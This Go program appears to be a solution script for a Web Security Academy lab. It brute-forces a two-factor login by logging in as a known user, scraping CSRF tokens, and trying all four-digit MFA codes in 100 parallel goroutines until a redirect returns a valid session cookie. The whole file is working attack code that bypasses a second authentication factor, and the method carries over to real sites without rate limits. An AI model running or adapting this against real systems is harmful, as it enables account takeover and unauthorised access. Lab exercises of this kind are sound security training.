package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strconv"
	"strings"
)

// Change host to your own lab
var host string = "https://0aae002e04be0ff5816cb29d0002005c.web-security-academy.net"

// Change threads to the number of threads you want to run in goroutines
var threads int = 100

var csrfGrep string = `<input required type="hidden" name="csrf" value="([^"]+)"`
var complete bool = false
var end_mfa int = 10000

// http client with ErrUseLastResponse to disable redirects on requests
var client = &http.Client{
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

func main() {

	// Creating a channel to wait for every response, basically a synchronization mechanism
	done := make(chan bool)
	for mfa := 0; mfa <= end_mfa && !complete; mfa += threads {

		for i := mfa; i < mfa+threads; i++ {
			go run(formatNumber(i), done)
		}

		for i := mfa; i < mfa+threads; i++ {
			<-done
		}
	}
	log.Println("Finished!")
}

func formatNumber(mfa int) string {
	mfaString := strconv.Itoa(mfa)
	for len(mfaString) < 4 {
		mfaString = "0" + mfaString
	}
	return mfaString
}

// this function runs all the requests, in order
func run(mfa string, done chan bool) {

	cookie, csrf, err := getLogin()
	if err != nil {
		log.Fatalf("Error trying to GET /login: %v", err)
	}

	cookie, err = postLogin(cookie, csrf)
	if err != nil {
		log.Fatalf("Error trying to POST /login: %v", err)
	}

	csrf, err = getLogin2(cookie)
	if err != nil {
		log.Fatalf("Error trying to GET /login2: %v", err)
	}

	correctCookie, err := postLogin2(cookie, csrf, mfa)
	if err != nil {
		log.Fatalf("Error trying to POST /login2: %v", err)
	}

	if correctCookie != "" {
		log.Printf("Cookie found: %s", correctCookie)
		complete = true
	}
	done <- true
}

func getLogin() (sessionCookie string, csrf string, err error) {

	// Making the GET HTTP request to /login
	resp, err := http.Get(host + "/login")
	if err != nil {
		return "", "", err
	}

	// Reading the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}

	// Extracting the session cookie from response
	sessionCookie = resp.Header.Get("Set-Cookie")[:40]

	// Extracting the CSRF token from response body
	re := regexp.MustCompile(csrfGrep)
	match := re.FindStringSubmatch(string(body))
	if len(match) > 0 {
		csrfGrep := match[1]
		// Returns the csrf, the session cookie, and the error(a null value)
		return sessionCookie, csrfGrep, nil
	} else {
		fmt.Println("csrf token not found")
		return "", "", nil
	}
}

func postLogin(cookie string, csrf string) (followCookie string, err error) {

	// Defining the payload for the next request
	payload := strings.NewReader(fmt.Sprintf("csrf=%s&username=carlos&password=montoya", csrf))

	// Creating the POST HTTP request to /login
	req, err := http.NewRequest(http.MethodPost, host+"/login", payload)
	if err != nil {
		return "", err
	}

	// Adding cookie to the headers
	req.Header.Set("Cookie", cookie)

	// Running the request
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}

	// Extracting the session cookie from response
	sessionCookie := resp.Header.Get("Set-Cookie")[:40]

	// Returns the session cookie
	return sessionCookie, nil
}

func getLogin2(cookie string) (csrf string, err error) {

	// Creating the GET HTTP request to /login2
	req, err := http.NewRequest(http.MethodGet, host+"/login2", nil)
	if err != nil {
		return "", err
	}

	// Adding cookie to the headers
	req.Header.Set("Cookie", cookie)

	// Running the request
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}

	// Reading the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	// Extracting the CSRF token from response body
	re := regexp.MustCompile(csrfGrep)
	match := re.FindStringSubmatch(string(body))
	if len(match) > 0 {
		csrfGrep := match[1]
		// Returns the csrf
		return csrfGrep, nil
	} else {
		fmt.Println("csrf token not found")
		return "", nil
	}
}

func postLogin2(cookie string, csrf string, mfa string) (correctCookie string, err error) {

	// Defining the payload for the next request
	payload := strings.NewReader(fmt.Sprintf("csrf=%s&mfa-code=%s", csrf, mfa))

	// Creating the POST HTTP request to /login2
	req, err := http.NewRequest(http.MethodPost, host+"/login2", payload)
	if err != nil {
		return "", err
	}

	// Adding cookie to the headers
	req.Header.Set("Cookie", cookie)

	// Running the request
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}

	// Checking the status code, if not 302 gave a feedback on terminal and return empty
	if resp.StatusCode != 302 {
		fmt.Printf("code: %s -> status %d\n", mfa, resp.StatusCode)
		return "", nil
	}

	// Extracting the session cookie from response
	sessionCookie := resp.Header.Get("Set-Cookie")[:40]

	// Returns the session cookie
	return sessionCookie, nil
}
